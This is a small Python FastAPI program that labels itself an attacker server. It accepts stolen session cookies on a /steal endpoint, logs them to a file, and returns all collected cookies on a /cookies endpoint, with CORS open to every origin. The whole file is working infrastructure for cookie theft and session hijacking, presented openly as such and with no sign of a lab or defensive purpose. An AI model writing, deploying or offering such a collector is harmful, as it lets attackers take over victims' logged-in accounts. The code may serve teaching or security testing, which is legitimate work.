from fastapi import FastAPI, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware


app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class Cookie (BaseModel):
    session_cookie: str


@app.get("/")
async def read_root():
    return {"message": "This is the attacker server."}

@app.post("/steal")
async def steal_cookie(cookie: Cookie):
    print(f"Stolen cookie: {cookie.session_cookie}")
    with open("stolen_cookies.txt", "a") as f:
        f.write(f"{cookie.session_cookie}\n")
    return {"status": "Cookie stolen"}


@app.get("/cookies")
def get_stolen_cookies():
    try:
        with open("stolen_cookies.txt", "r") as f:
            cookies = f.readlines()
        return {"stolen_cookies": [cookie.strip() for cookie in cookies]}
    except FileNotFoundError:
        return {"stolen_cookies": []}